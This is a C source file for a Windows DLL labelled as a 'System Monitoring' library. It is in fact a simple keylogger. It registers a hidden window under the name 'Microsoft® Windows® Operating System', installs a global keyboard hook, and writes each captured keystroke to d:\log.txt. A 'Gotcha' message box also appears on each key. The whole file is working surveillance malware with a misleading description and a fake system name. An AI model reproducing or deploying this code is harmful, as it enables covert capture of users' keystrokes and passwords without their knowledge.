
// Library for System Monitoring
// Written by Arjun Menon

#include <windows.h>

static char szAppName[] = "Microsoft® Windows® Operating System" ;
int WINAPI StartSystem(HINSTANCE hInstance, 
					   HINSTANCE hPrevInstance, 
					   PSTR szCmdLine, int nCmdShow)
{
     HWND        hwnd ;
     MSG         msg ;
     WNDCLASS    wndclass ;
	 LRESULT CALLBACK WndProc (HWND hwnd, UINT message,
		 WPARAM wParam, LPARAM lParam);

     wndclass.style         = CS_HREDRAW | CS_VREDRAW ;
     wndclass.lpfnWndProc   = WndProc ;
     wndclass.cbClsExtra    = 0 ;
     wndclass.cbWndExtra    = 0 ;
     wndclass.hInstance     = hInstance ;
     wndclass.hIcon         = LoadIcon (NULL, IDI_WINLOGO) ;
     wndclass.hCursor       = LoadCursor (NULL, IDC_ARROW) ;
     wndclass.hbrBackground = (HBRUSH) GetStockObject (WHITE_BRUSH) ;
     wndclass.lpszMenuName  = NULL ;
     wndclass.lpszClassName = szAppName ;
     
     if (!RegisterClass (&wndclass))
          return 0 ;
     
     hwnd = CreateWindow (szAppName, szAppName,
                          WS_OVERLAPPEDWINDOW,
                          CW_USEDEFAULT, CW_USEDEFAULT,
                          CW_USEDEFAULT, CW_USEDEFAULT,
                          NULL, NULL, hInstance, NULL) ;

	 //ShowWindow(hwnd, nCmdShow);

     while (GetMessage (&msg, NULL, 0, 0))
     {
          TranslateMessage (&msg) ;
          DispatchMessage (&msg) ;
     }

     return msg.wParam ;
}

void StartSensing();

LRESULT CALLBACK WndProc (HWND hwnd, UINT message,
						  WPARAM wParam,LPARAM lParam)
{
	switch (message)
	{
	case WM_CREATE:
		StartSensing();
		break;
	case WM_CLOSE:
		DestroyWindow(hwnd);
		break;
	case WM_DESTROY:
		PostQuitMessage (0) ;
		return 0 ;
	}
	return DefWindowProc (hwnd, message, wParam, lParam) ;
}

HANDLE hDLL = NULL;

int WINAPI DllMain(HANDLE hModule,
				   DWORD ul_reason_for_call,
				   LPVOID lpReserved)
{
	hDLL = hModule;

	return TRUE;
}

__declspec(dllexport) void ActivateSystem()
{
	StartSystem((HINSTANCE)hDLL, NULL, "", SW_NORMAL);
}

HANDLE hFile = NULL;
DWORD nFile = 0;

void StartSensing()
{
	hFile = CreateFile("d:\\log.txt",
             GENERIC_WRITE,
             FILE_SHARE_READ,
             NULL,
             CREATE_ALWAYS,
             FILE_ATTRIBUTE_NORMAL,
             NULL);

	HHOOK KeylogHook = NULL;
	LRESULT CALLBACK KeyboardHookProc
	(int code, WPARAM wParam, LPARAM lParam);
	KeylogHook = SetWindowsHookEx
	(WH_KEYBOARD,(HOOKPROC)KeyboardHookProc,(HINSTANCE)hDLL,NULL);
}

LRESULT CALLBACK KeyboardHookProc
(int code, WPARAM wParam, LPARAM lParam)
{
	char k[] = { wParam, 0 };
	MessageBox(0,"Gotcha",k,0);
	WriteFile(hFile, k,2,&nFile,NULL);

	return CallNextHookEx(NULL, code, wParam, lParam);
}